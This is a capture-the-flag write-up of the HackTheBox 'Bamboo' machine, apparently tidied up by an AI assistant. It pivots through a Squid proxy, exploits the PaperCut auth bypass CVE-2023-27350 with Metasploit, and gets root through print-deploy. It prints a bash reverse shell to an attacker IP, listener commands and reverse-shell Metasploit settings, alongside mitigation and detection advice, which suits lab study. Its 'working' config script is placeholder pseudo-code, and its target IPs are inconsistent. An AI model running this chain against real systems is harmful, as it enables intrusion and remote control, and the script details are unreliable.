# Bamboo — HackTheBox (Medium)

**TL;DR:** The machine exposes a Squid proxy and internal services including a PaperCut admin panel. PaperCut NG is vulnerable to an authentication bypass (CVE-2023-27350 / ZDI-CAN-18987). Using the Squid proxy to reach the admin panel, I exploited the auth bypass to enable `print-and-device.script.enabled`, gained an initial user shell via a Metasploit payload, and escalated to root by abusing the print-deploy functionality that executes a writable script as root. Final: `user.txt` and `root.txt` recovered.

---

## Target information
- Name: Bamboo
- Difficulty: Medium
- Key takeaways: proxied internal scanning (Squid), PaperCut auth bypass, insecure print-deploy flow leading to root execution.

---

## Table of contents
1. Recon & enumeration
2. Gaining initial access (PaperCut auth bypass)
3. Privilege escalation (print-deploy -> root)
4. Mitigations & detection
5. Artifacts / screenshots
6. Quick checklist

---

## 1) Recon & enumeration

### Initial scan (from attacking VM)
I discovered a Squid proxy and a web service. The proxy allowed access to internal-only endpoints which were not visible from the external interface directly.

Example commands (copy-paste friendly):

```bash
# basic fast scan (non-proxied) to identify open services
nmap -sC -sV -p- -T4 10.10.10.100

# proxied nmap scan through Squid using proxychains (proxychains.conf configured to use the Squid IP/port)
proxychains4 nmap -sC -sV -p- -T4 10.10.10.100
```

> Note: configure `/etc/proxychains.conf` or equivalent to point at the Squid proxy (example below):

```text
# /etc/proxychains.conf
[ProxyList]
http 10.129.54.74 3128
```

Use the proxied scan to reach internal admin panels that are only available from the host or internal subnet.

---

## 2) Gaining initial access — PaperCut auth bypass

### Vulnerability
PaperCut NG versions (including 22.0 in this machine) had an authentication bypass allowing unauthenticated access to admin endpoints. Relevant identifier: **CVE-2023-27350** (also referenced by ZDI advisory ZDI-CAN-18987).

### Exploitation approach
1. Use the Squid proxy to reach the PaperCut admin UI.
2. Exploit the auth bypass to read and update configuration keys (specifically `print-and-device.script.enabled`).
3. Deploy a Metasploit payload (reverse shell) through the now-enabled script execution flow to obtain a user shell.

### Example Metasploit workflow
Show `set` lines and important options so readers can reproduce this reliably.

```text
# In msfconsole
use multi/http/papercut_ng_auth_bypass
set RHOSTS 127.0.0.1            # or the internal address reachable through the proxy
set RPORT 9191                  # example admin port; replace with scanned port
set LHOST 10.10.15.52           # your attacking machine
set LPORT 4444
set Proxies http:10.129.54.74:3128  # point metasploit to use the Squid proxy
set ReverseAllowProxy true
show options
run
```

> Important: `Proxies` and `ReverseAllowProxy` instruct Metasploit to route the reverse connection appropriately when exploiting via proxy. Verify `show options` before running.


### Modified `update_config.py` (explanation)
I modified a public exploit script to automate setting `print-and-device.script.enabled=Y` using the unauthenticated session the bypass provides. Below is an annotated **example** that demonstrates the logic (adapt to your environment).

```python
#!/usr/bin/env python3
"""
modified_update_config.py — example to find and set the PaperCut config key
Logic:
 - Obtain unauthenticated session/JSESSIONID via the auth-bypass endpoint
 - POST to the server's config update endpoint to set print-and-device.script.enabled=Y
 - Verify the change

This example is intentionally concise — adapt error handling and logging for production use.
"""

import requests

TARGET = 'http://10.129.54.74:9191'
PROXIES = {'http':'http://10.129.54.74:3128','https':'http://10.129.54.74:3128'}

# 1) obtain bypass session (pseudo-step; exact endpoint depends on the target)
# session = requests.Session()
# session.proxies.update(PROXIES)
# r = session.get(TARGET + '/some/bypass/endpoint')
# jsession = r.cookies.get('JSESSIONID')

# 2) send update to configuration
payload = {
    'key': 'print-and-device.script.enabled',
    'value': 'Y'
}
# r = session.post(TARGET + '/api/admin/config/set', data=payload)
# print(r.status_code, r.text)

# 3) Verify
# r = session.get(TARGET + '/api/admin/config/get?key=print-and-device.script.enabled')
# print(r.text)

# NOTE: Replace endpoints and payload shape with the correct ones from the PaperCut UI you discovered.
```

Include the working exploit script in your writeup (as you did) and annotate every step so readers understand the request/response cycle.

---

## 3) Privilege escalation — print-deploy execution as root

### Overview
With `print-and-device.script.enabled=Y`, the admin print-deploy functionality accepts scripts that are later executed by the system (as root). The attack chain used these capabilities to upload and execute a payload that resulted in a root shell.

### Steps (compact attack-chain summary)
1. Use Squid proxy to reach internal admin panel.  
2. Exploit PaperCut auth bypass to enable `print-and-device.script.enabled`.  
3. Use Metasploit / custom payload to get the `papercut` user shell (low-privilege).  
4. Log in to admin panel (or use admin endpoints now accessible) and upload a malicious "print-deploy" script.  
5. The system runs the uploaded script as root — obtain `root`.

### Example: upload and execute
- Upload a small shell script that opens a reverse shell to the attacker (ensure your listener is ready).  
- Because the print-deploy mechanism executes as root, the reverse shell connects back as root (or allows reading/writing of root-owned files), enabling `root.txt` capture.

**Example payload (upload with admin functionality):**

```bash
#!/bin/bash
# /tmp/getroot.sh - executed by print-deploy as root
bash -i >& /dev/tcp/10.10.15.52/5555 0>&1
```

Start a listener locally:

```bash
# attacker machine
nc -lvnp 5555
```

Then trigger the print-deploy functionality in the admin panel to execute the uploaded script.

---

## 4) Mitigations & detection
**Mitigations**
- Patch PaperCut to a version not vulnerable to CVE-2023-27350.  
- Restrict access to the admin panel: bind to localhost or put behind authenticated VPN / firewall rules.  
- Harden print-deploy: avoid executing uploaded scripts as root; require signed scripts or run them with restricted privileges.  
- Remove / limit unnecessary proxies and review Squid configuration to restrict which internal hosts can be reached.

**Detection / logging**
- Monitor for unusual admin API calls or configuration changes (especially writes to `print-and-device.script.enabled`).  
- Alert on unexpected outbound connections from the print subsystem or `papercut` process.  
- Watch for new files written to typical upload folders or `/tmp` followed by execution events.

---

## 5) Artifacts / screenshots
Label and include your screenshots or console outputs and reference them inline. Example:

- **Figure 1**: Squid proxy configuration screenshot (showing `3128` service)
- **Figure 2**: PaperCut admin UI before/after enabling `print-and-device.script.enabled`
- **Figure 3**: Metasploit `show options` + `run` output
- **Figure 4**: Netcat listener receiving a root shell and `cat /root/root.txt`

Trim long command outputs — include only the important lines and show file paths.

---

## 6) Quick checklist (things to add before publishing)
- [ ] Add a one-line TL;DR at the top (done).  
- [ ] Include the CVE ID + links to advisories (CVE-2023-27350, ZDI-CAN-18987).  
- [ ] Paste the full `msfconsole` `set` commands and `show options` output (sanitized).  
- [ ] Include the exact `update_config.py` script you used (annotated).  
- [ ] Label all screenshots (Fig.1, Fig.2, ...).  
- [ ] Add a short mitigation & detection section (done).  
- [ ] Grammar / capitalization pass (PaperCut, Squid, Metasploit consistency).

---

## Appendix: Useful commands & references

- Example proxychains setup: `/etc/proxychains.conf` — add `http 10.129.54.74 3128` under `[ProxyList]`.

- Metasploit multi/http/papercut_ng_auth_bypass is useful; confirm module name in your current msfinstall prior to use.

- CVE / advisory references to include in your final writeup:
  - CVE-2023-27350
  - ZDI advisories (search ZDI-CAN-18987)


---

If you'd like, I can now:
- produce a blog-style 800–1200 word writeup for public posting, or
- paste the final ready-to-publish README content into a downloadable file.

*End of cleaned writeup.*

